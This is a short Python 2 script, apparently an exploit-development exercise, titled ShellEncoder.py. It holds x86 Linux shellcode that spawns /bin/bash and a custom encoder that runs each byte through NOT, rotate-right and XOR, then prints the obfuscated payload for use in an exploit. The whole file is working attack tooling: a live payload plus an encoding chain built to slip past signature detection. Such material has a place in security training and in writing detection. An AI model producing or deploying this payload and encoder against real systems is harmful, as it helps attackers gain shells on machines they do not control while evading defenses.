#!/usr/bin/python

# Author  : Alessio Parzian
# Filename: ShellEncoder.py

# This script is an helper to encode any shellcode using a custom encoder

# Exec bin/sh shellcode
shellcode = "\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

shellcode = bytearray(shellcode)

xor_fixed = 0xbb 
shift_fixed = 0x02

# This custom encoder makes use of three techniques in a chain
#	NOT encoding
#	ROTATE encoding
#	XOR encoding

for idx,opcode in enumerate(shellcode):
	# Apply NOT encoding
	opcode = ~opcode
	opcode = opcode & 0xff # Mask the result with the goal of preserving only the byte modified
	# Apply Rotation right
	opcode_shifted = opcode >> shift_fixed
	opcode_rotl = (opcode << (8 - shift_fixed)) & 0xff 
	opcode = opcode_shifted | opcode_rotl
	# Apply fixed xor
	opcode = (opcode ^ xor_fixed) & 0xff
	# Save encoded opcode
	shellcode[idx] = opcode

print '==========================='
print 'NOT + ROTATE + XOR'
print 'Shellcode length: {0}'.format(len(shellcode))
print '==========================='
shellcode_final = ""
shellcode_final_array = ""
for opcode in shellcode:
	shellcode_final += "\\x"+"{:02x}".format(opcode)
	shellcode_final_array += "0x"+"{:02x}".format(opcode)+","
shellcode_final_array = shellcode_final_array[:-1]
print shellcode_final
print shellcode_final_array
print '==========================='